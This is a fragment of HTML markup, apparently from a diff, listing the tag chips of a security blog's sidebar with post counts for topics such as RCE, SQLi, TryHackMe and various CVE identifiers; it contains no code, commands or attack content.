+<span class=side-tax-name>RCE</span>
+<b class=side-tax-count>9</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/bof/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>BOF</span>
+<b class=side-tax-count>8</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/docker/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Docker</span>
+<b class=side-tax-count>8</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/elf/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>ELF</span>
+<b class=side-tax-count>8</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/sql-injection/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>SQLi</span>
+<b class=side-tax-count>8</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/osint/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>OSINT</span>
+<b class=side-tax-count>7</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/smb/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>SMB</span>
+<b class=side-tax-count>7</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/thm/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>TryHackMe</span>
+<b class=side-tax-count>7</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/unity/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Unity</span>
+<b class=side-tax-count>7</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/gdb/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>GDB</span>
+<b class=side-tax-count>5</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/path-traversal/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>PathTraversal</span>
+<b class=side-tax-count>5</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/ssrf/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>SSRF</span>
+<b class=side-tax-count>5</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/dotnet/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>.NET</span>
+<b class=side-tax-count>4</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/file-upload/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>FileUpload</span>
+<b class=side-tax-count>4</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/format-string/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>FormatString</span>
+<b class=side-tax-count>4</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/nodejs/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Node.js</span>
+<b class=side-tax-count>4</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/reversing/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Reversing</span>
+<b class=side-tax-count>4</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/shellcode/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Shellcode</span>
+<b class=side-tax-count>4</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/deserialization/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Deserialization</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/embeddings/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Embeddings</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/frida/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Frida</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/logic-analyzer/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>LogicAnalyzer</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/memory/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Memory</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/sdl/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>SDL</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/unity-il2cpp/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>UnityIL2CPP</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/unity-mono/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>UnityMono</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/xss/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>XSS</span>
+<b class=side-tax-count>3</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2014-6271/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2014-6271</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/flask/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Flask</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/ghidra/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Ghidra</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/git/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Git</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/heap/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Heap</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/joomla/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Joomla</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/nmap/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Nmap</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/pcap/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>PCAP</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/powershell/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Powershell</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/pytorch/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Pytorch</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/sklearn/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Sklearn</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/spi/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>SPI</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/ssh/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>SSH</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/template-injection/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>TemplateInjection</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/vigenere/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Vigenere</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/wordpress/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>WordPress</span>
+<b class=side-tax-count>2</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/angr/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Angr</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/blockchain/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Blockchain</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/bloodhound/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Bloodhound</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/bluetooth/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Bluetooth</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/canary/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>Canary</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2012-4869/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2012-4869</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2014-0160/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2014-0160</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2016-10045/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2016-10045</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2016-5195/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2016-5195</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2017-16995/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2017-16995</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2017-5899/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2017-5899</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2017-7650/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2017-7650</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2018-14665/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2018-14665</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2019-17671/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2019-17671</span>
+<b class=side-tax-count>1</b>
+</a><a class="side-tax-chip side-tax-chip--tag tax-tags" href=/blog/tags/cve-2021-22555/><svg class="ico ico-tag ico-xs" viewBox="0 0 24 24" aria-hidden="true" role="presentation" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20.6 13.4l-7.2 7.2a2 2 0 01-2.8.0L3 13V3h10l7.6 7.6a2 2 0 010 2.8z"/><path d="M7.5 7.5h.01"/></svg>
+<span class=side-tax-name>CVE-2021-22555</span>
+<b class=side-tax-count>1</b>
